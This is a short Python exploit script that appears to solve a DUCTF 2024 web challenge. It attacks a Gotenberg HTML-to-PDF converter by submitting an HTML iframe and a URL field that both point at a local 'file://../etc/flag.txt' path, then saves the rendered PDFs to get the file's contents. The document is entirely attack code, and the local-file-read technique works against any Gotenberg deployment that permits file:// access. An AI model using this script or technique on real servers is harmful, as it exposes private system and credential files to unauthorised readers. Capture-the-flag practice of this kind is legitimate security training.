import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

# gotenberg

index_html = b"""
<!DOCTYPE html>

<h1>HELLO</h1>

<iframe src='file://../etc/flag.txt'></iframe>

</html>

"""

base_url = "https://web-hah-got-em-20ac16c4b909.2024.ductf.dev"

# POST /forms/chromium/convert/html

url = f"{base_url}/forms/chromium/convert/html"
r = requests.post(url, files={"index.html": index_html})
with open("index.pdf", "wb") as f:
    f.write(r.content)
print(r.text)

# POST /forms/chromium/convert/url

mp = MultipartEncoder(fields={"url": "file://../etc/flag.txt"})

url = f"{base_url}/forms/chromium/convert/url"
r = requests.post(url, data=mp, headers={"Content-Type": mp.content_type})

with open("flag.pdf", "wb") as f:
    f.write(r.content)
print(r.text)